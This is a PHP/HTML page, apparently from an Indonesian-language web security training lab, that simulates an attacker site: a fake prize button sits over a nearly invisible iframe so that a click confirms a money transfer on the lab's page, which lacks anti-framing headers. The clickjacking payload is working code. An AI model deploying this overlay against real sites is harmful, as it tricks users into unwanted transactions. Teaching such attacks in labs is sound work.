<?php
// Halaman ini mensimulasikan situs attacker eksternal - bukan bagian dari
// alur normal aplikasi, dan sengaja tidak dipasang di navigasi (nav.php)
// karena secara konsep halaman ini "bukan milik" aplikasi ini. Halaman ini
// meng-embed lab6_missing_headers_clickjacking.php di dalam iframe yang
// disembunyikan (opacity mendekati nol) lalu menumpuknya persis di bawah
// tombol umpan "Klaim Hadiah", sehingga klik korban sebenarnya jatuh ke
// tombol "Konfirmasi Transfer" pada halaman asli di dalam iframe.
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Anda Menang Hadiah!</title>
<style>
  body { font-family: Arial, Helvetica, sans-serif; margin: 0; background: #fef3c7; }
  .wrap { max-width: 900px; margin: 40px auto; padding: 20px; }
  .banner { background: #fff; border: 2px dashed #f59e0b; border-radius: 10px; padding: 24px; text-align: center; }
  .banner h1 { color: #b45309; }
  .stage { position: relative; width: 480px; height: 120px; margin: 30px auto; }
  .decoy-btn {
    position: absolute; top: 0; left: 0; width: 480px; height: 44px;
    background: #16a34a; color: #fff; font-size: 18px; font-weight: bold;
    border: none; border-radius: 8px; cursor: pointer; z-index: 2;
  }
  iframe.evil-frame {
    position: absolute; top: -400px; left: -20px;
    width: 520px; height: 520px;
    opacity: 0.001;
    z-index: 1;
    border: none;
  }
  .note { font-size: 13px; color: #92400e; background: #fffbeb; border: 1px solid #fcd34d; padding: 10px; border-radius: 6px; margin-top: 20px; }
</style>
</head>
<body>
<div class="wrap">
  <div class="banner">
    <h1>Selamat! Anda memenangkan hadiah!</h1>
    <p>Klik tombol di bawah untuk klaim hadiah kamu sekarang juga.</p>
    <div class="stage">
      <!-- Tombol umpan attacker - terlihat oleh korban -->
      <button class="decoy-btn">Klaim Hadiah</button>
      <!-- Halaman asli, disembunyikan (opacity ~0) dan diposisikan persis
           supaya tombol "Konfirmasi Transfer" di dalamnya bertumpuk tepat
           di bawah tombol umpan di atas. -->
      <iframe class="evil-frame" src="lab6_missing_headers_clickjacking.php"></iframe>
    </div>
    <p class="note">
      [Untuk lab] Ini adalah simulasi halaman attacker eksternal. Di dunia nyata halaman ini akan
      di-hosting di domain lain sepenuhnya (bukan di aplikasi ini), tapi karena
      <code>lab6_missing_headers_clickjacking.php</code> tidak mengirim
      <code>X-Frame-Options</code>/<code>frame-ancestors</code>, browser tetap mengizinkan halaman
      itu di-embed di sini. Setelah klik "Klaim Hadiah" di atas, kembali ke
      <a href="lab6_missing_headers_clickjacking.php">lab6_missing_headers_clickjacking.php</a>
      dan lihat log transfer — akan ada entri baru walau kamu tidak pernah benar-benar bermaksud
      menekan tombol transfer.
    </p>
  </div>
</div>
</body>
</html>
